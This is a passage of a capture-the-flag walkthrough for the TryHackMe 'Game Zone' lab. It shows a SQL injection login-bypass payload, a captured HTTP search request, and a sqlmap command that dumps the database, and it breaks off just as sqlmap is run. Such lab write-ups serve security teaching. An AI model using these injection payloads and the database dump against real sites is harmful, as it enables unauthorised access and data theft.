This is a walkthrough of the Tryhackme room called "Game Zone".
 
Ths description of this room states

>This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

This THM room doesn't ask to run NMap scans or any of the initial enumeration so we will start by going directly to the site. 

## The Game Zone Website

Navigating to the site in a browser, we see a website called Game Zone. 

![](assets/2021-02-21_9-13-48.jpg)

There is a User Login panel on the left side so this looks like a good place to attack so we try to login as admin.

```
SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
```
The room says that the site doesn't have any user called admin but the above query works and brings you to a portal page at portal.php.

## Using SQLMap

The next thing to do is to dump the SQL database using SQLMap. 

The room directs you to intercept a search request using BurpSuite which is what I did and got back the following.

```
POST /portal.php HTTP/1.1
Host: 10.10.108.67
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://10.10.108.67
Connection: close
Referer: http://10.10.108.67/portal.php
Cookie: PHPSESSID=suepevsj6e11r9tko2ggj5q8q5
Upgrade-Insecure-Requests: 1

searchitem=testing
```

This was then saved to a file called sqlrequest.txt.

By the way, it is also possible to view the request using the developer tools in Firefox from the Network tab. 

After capturing the request, we then feed this into SQLmap

```
sqlmap -r sqlrequest.txt -dbms mysql -dump
```
where 

-r : use the intercepted request

-dbms : what database we are dealing with

-dump : dump the entire database.

This yeilds the following

```
(dspo6ã‰¿kali)[~/pentest/boxes/thm/game_zone]$ sqlmap -r sqlrequest.txt -dbms mysql -dump
